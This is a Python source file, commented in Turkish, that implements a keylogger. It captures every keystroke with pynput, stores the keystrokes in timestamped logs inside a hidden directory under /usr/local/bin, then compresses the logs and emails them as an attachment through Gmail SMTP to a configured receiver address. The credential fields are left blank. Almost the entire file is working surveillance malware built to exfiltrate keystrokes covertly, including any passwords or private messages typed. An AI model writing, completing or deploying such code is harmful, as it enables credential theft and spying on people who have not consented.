from pathlib import Path
from pynput import keyboard
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import os, threading, time, tarfile, smtplib, shutil

errorLogFilePath = "/usr/local/bin/.ylogs/errorLogs/errorLog.txt" # hataların logunu tutan txt dosyasının yolu

text = ""
intervaL = 10

now = datetime.now()
date = now.strftime("%d-%m-%Y")

logsTarGzPath = "/usr/local/bin/logs.tar.gz" # log klasörünün sıkıştırılmış halinin yolu

# kullanmak için öncelikle google hesabından uygulama oluşturmak gerekiyor

senderMail = # logları yollayan mail
receiverMail = # logların gideceği mail @gmail.com
googleApplicationPassword = # oluşturulan uygulamanın password u

os.makedirs("/usr/local/bin/.ylogs/", exist_ok=True)

def hourMinuteSecond(): # o andaki saat dakika saniye bilgisini geri döndürür
    now = datetime.now()
    return f"Hour:{now.hour} - Min: {now.minute} - Sec: {now.second}"

def deleteFiles():
    if os.path.exists("/usr/local/bin/.ylogs/"):
        shutil.rmtree("/usr/local/bin/.ylogs/")
    else:
        pass

def compressFiles(): # logların olduğu klasörü tar.gz formatına dönüştürür
    with tarfile.open("/usr/local/bin/logs.tar.gz", "w:gz") as tar:
        tar.add(str("/usr/local/bin/.ylogs/"), arcname=".")
    deleteFiles()

def getFolderSize(folder_path): # bir klasörün boyutunu hesaplayan fonksiyon
    return sum(f.stat().st_size for f in Path(folder_path).rglob('*') if f.is_file()) / (1024**2)


def sendMail(): # email yollayan fonksiyon
    compressFiles()
    body = "Logs"
    
    msg = MIMEMultipart()
    msg['From'] = senderMail
    msg['To'] = receiverMail
    msg['Subject'] = "LOGS"

    msg.attach(MIMEText(body, 'plain'))

    file_name = "logs.tar.gz"

    with open(logsTarGzPath, "rb") as file:
        part = MIMEApplication(file.read(), Name= file_name)
        part['Content-Disposition'] = f'attachment; filename="{file_name}"'
        msg.attach(part)

    attempt = 0
    while attempt < 6:
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(senderMail, googleApplicationPassword)
            server.sendmail(senderMail, receiverMail, msg.as_string())
            break
        except:
            attempt += 1
        finally:
            server.quit()
            os.remove(logsTarGzPath)
            break
    time.sleep(1100)
sendMailThread = threading.Thread(target=sendMail)
sendMailThread.start()

def sizeControl():
    if getFolderSize("/usr/local/bin/.ylogs/") > 650:
        sendMail()
    time.sleep(1140)
sizeControlThread = threading.Thread(target=sizeControl)
sizeControlThread.start()

if not os.path.exists("/usr/local/bin/.ylogs/errorLogs"):
    os.makedirs("/usr/local/bin/.ylogs/errorLogs/", exist_ok=True)
    errorLogFile = open(errorLogFilePath, "w").close()

if os.path.exists(f"/usr/local/bin/.ylogs/{date}.txt"):
    index = 1
    while os.path.exists(f"/usr/local/bin/.ylogs/{date}({index}).txt"):
        index += 1
    logFilePath = f"/usr/local/bin/.ylogs/{date}({index}).txt"
    logFile = open(logFilePath, "w")
    logFile.write(f"{date} - {hourMinuteSecond()}\n")
    logFile.close()
else:
    logFilePath = f"/usr/local/bin/.ylogs/{date}.txt"
    logFile = open(logFilePath, "w")
    logFile.write(f"{date} | {hourMinuteSecond()}\n")
    logFile.close()

def logging():
    global text
    if text.strip() != "":
        try:
            with open(logFilePath, "a", encoding="utf-8") as file:
                file.write(f"\n{text} {(60-len(text))*' '}{hourMinuteSecond()}\n{'-'*100}")
            text = ""
        except Exception as e:
            with open(errorLogFilePath, "a", encoding="utf-8") as file:
                file.write(f"{date} ({hourMinuteSecond()})\nError: {type(e).__name__} - {str(e)}\n\n")

    timer = threading.Timer(intervaL, logging)
    timer.start()

def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "(Enter)"
    elif key == keyboard.Key.tab:
        text += "(Tab)"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.caps_lock:
        pass
    else:
        text += str(key).strip("'")

with keyboard.Listener(on_press=on_press) as Listener:
    logging()
    Listener.join()
